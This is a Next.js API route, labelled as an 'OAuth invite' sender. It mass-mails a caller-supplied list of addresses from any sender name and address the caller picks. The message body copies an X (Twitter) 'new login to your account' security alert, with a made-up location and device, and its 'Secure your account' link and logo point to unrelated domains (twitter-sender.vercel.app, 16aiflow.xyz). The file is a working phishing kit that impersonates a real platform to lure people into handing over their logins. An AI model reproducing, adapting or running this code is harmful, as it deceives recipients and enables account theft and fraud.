import { generateOAuthURL, generateStaticOAuthURL } from "@/lib/utils";
import { NextRequest, NextResponse } from "next/server";
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

const rateLimitStore = new Map<string, number>();

interface EmailRequest {
	emails: string[];
	fromEmail?: string;
	fromName?: string;
	useStaticUrl?: boolean;
}

export async function POST(request: NextRequest) {
	try {
		const body: EmailRequest = await request.json();
		const { emails, fromEmail, fromName, useStaticUrl } = body || {} as EmailRequest;

		if (!emails || !Array.isArray(emails) || emails.length === 0) {
			return NextResponse.json(
				{ error: "Invalid or missing emails array" },
				{ status: 400 },
			);
		}

		// Very basic in-memory rate limiting per caller IP (best-effort in serverless)
		const clientIP =
			(request as any).ip ||
			request.headers.get("x-forwarded-for") ||
			request.headers.get("x-real-ip") ||
			"unknown";
		const now = Date.now();
		const last = rateLimitStore.get(String(clientIP));
		if (last && now - last < 60_000) {
			return NextResponse.json(
				{ error: "Rate limit exceeded. Try again in a minute." },
				{ status: 429 },
			);
		}
		rateLimitStore.set(String(clientIP), now);

		// Build OAuth URL
		const oauthUrl = useStaticUrl
			? await generateStaticOAuthURL()
			: await generateOAuthURL();

		// Send emails via Resend (collect results)
		const sender = (fromEmail || "noreply@yourdomain.com").trim();
		const name = (fromName || "").trim();

		// Basic email shape validation to avoid Resend 422s
		if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(sender)) {
			return NextResponse.json(
				{ error: "Invalid fromEmail. Use a valid email like name@example.com" },
				{ status: 400 },
			);
		}

		const fromField = name.length > 0 ? `${name} <${sender}>` : sender;

		const sendResults = await Promise.allSettled(
			emails.map((to) =>
				resend.emails.send({
					from: fromField,
					to,
					subject: "Complete your login",
					html: generateEmailHTML(),
				})
			),
		);

		const successful = sendResults.filter((r) => r.status === "fulfilled").length;
		const failed = sendResults.length - successful;

		return NextResponse.json({
			success: true,
			message: `Invites sent: ${successful}/${emails.length}`,
			summary: { total: emails.length, successful, failed },
			oauthUrl,
		});
	} catch (error) {
		console.error("Error in send-oauth-invites POST:", error);
		return NextResponse.json(
			{ error: "Failed to send OAuth invites" },
			{ status: 500 },
		);
	}
}

function generateEmailHTML(): string {
	return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>New login to your account</title>
    </head>
    <body bgcolor="#ffffff" style="margin:0;padding:0">
      <table cellpadding="0" cellspacing="0" border="0" width="100%" bgcolor="#F5F8FA" style="padding:0;margin:0;line-height:1px;font-size:1px">
<tbody>
<tr>
<td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px">
<table id="m_3433587548594661883header" align="center" width="448" style="width:448px;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0">
<tbody>
<tr>
<td style="min-width:448px;padding:0;margin:0;line-height:1px;font-size:1px"> </td>
</tr>
</tbody>
</table> </td>
</tr>
<tr>
<td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px">

<table id="m_3433587548594661883header" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0">
<tbody>
<tr>
<td colspan="3" height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px"> &nbsp; </td>
</tr>
<tr align="right">
<td width="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
<td align="right" style="padding:0;margin:0;line-height:1px;font-size:1px"> <a href="https://16aiflow.xyz/reset" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0"> <img width="32" align="right" src="https://16aiflow.xyz/mele.png" style="width:32px;margin:0;padding:0;display:block;border:none;outline:none"> </a> </td>
<td width="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
<tr>
<td colspan="4" height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px"> </td>
</tr>
</tbody>
</table>


<table id="m_3433587548594661883header" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0">
<tbody>
<tr align="left;">
<td width="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
<td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px">
<table cellpadding="0" cellspacing="0" border="0" style="padding:0;margin:0;line-height:1px;font-size:1px">
<tbody>
<tr>
<td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:24px;line-height:32px;font-weight:bold;color:#292f33;text-align:left;text-decoration:none"> We noticed a login to your account from a new device. Was this you? </td>
</tr>
<tr>
<td height="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
<tr>
<td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>New login</strong> </td>
</tr>
<tr>
<td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
<tr>
<td style="padding:0;margin:0;line-height:1px;font-size:1px">
<table width="100%" align="center" cellspacing="0" border="0" style="padding:0;margin:0;line-height:1px;font-size:1px">
<tbody>
<tr>
<td width="30" style="width:30px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
<td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px">
<table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" style="padding:0;margin:0;line-height:1px;font-size:1px">
<tbody>
<tr>
<td align="left" width="25%" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"><strong>Location*</strong></td>
<td width="15" style="width:15px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
<td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> Connaught Place, New Delhi, India</td>
</tr>
<tr>
<td align="left" width="25%" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"><strong>Device</strong></td>
<td width="15" style="width:15px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
<td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> FirefoxDesktop on Windows </td>
</tr>
</tbody>
</table> </td>
</tr>
</tbody>
</table> </td>
</tr>
<tr>
<td height="14" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
<tr>
<td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none"> *Location is approximate based on the login's IP address. </td>
</tr>
<tr>
<td height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
<tr>
<td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>If this was you</strong> </td>
</tr>
<tr>
<td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
<tr>
<td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> You can ignore this message. There's no need to take any action. </td>
</tr>
<tr>
<td height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
<tr>
<td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>If this wasn't you</strong> </td>
</tr>
<tr>
<td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
<tr>
<td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> Complete these steps now to protect your account. </td>
</tr>
<tr>
<td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
<tr>
<td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none">
<ul>
<li align="left" dir="ltr">
  <a href="https://twitter-sender.vercel.app/reset" 
     style="text-decoration:none;color:#1da1f2;font-weight:400;" 
     rel="noopener">
    Secure your account.
  </a> 
  You'll be logged out of all your active sessions except the one you're using at this time.
</li>
</ul> </td>
</tr>
<tr>
<td height="36" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
</tbody>
</table> </td>
<td width="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
</tbody>
</table>


<table id="m_3433587548594661883footer" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" cellpadding="0" cellspacing="0" border="0">
<tbody>
<tr>
<td height="36" style="height:36px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
<tr>
<td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span style="font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none"> <a href="https://16aiflow.xyz/help" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:600;color:#1da1f2;text-align:left;text-decoration:none" target="_blank">Help</a> &nbsp;|&nbsp; <a href="https://16aiflow.xyz/email" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:600;color:#1da1f2;text-align:left;text-decoration:none" target="_blank">Email security tips</a> </span> </td>
</tr>
<tr>
<td height="12" style="height:12px;line-height:1px;font-size:1px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
<tr>
<td height="6" style="height:6px;line-height:1px;font-size:1px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
<tr>
<td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span style="font-family:'Helvetica Neue Light',Helvetica,Arial,sans-serif;font-size:12px;padding:0px;margin:0px;font-weight:normal;line-height:16px;color:#8899a6;text-decoration:none"> X Corp. 1355 Market Street, Suite 900 San Francisco, CA 94103 </span> </td>
</tr>
<tr>
<td height="72" style="height:72px;padding:0;margin:0;line-height:1px;font-size:1px"></td>
</tr>
</tbody>
</table>
 </td>
</tr>
</tbody>
</table>
    </body>
    </html>
  `;
}
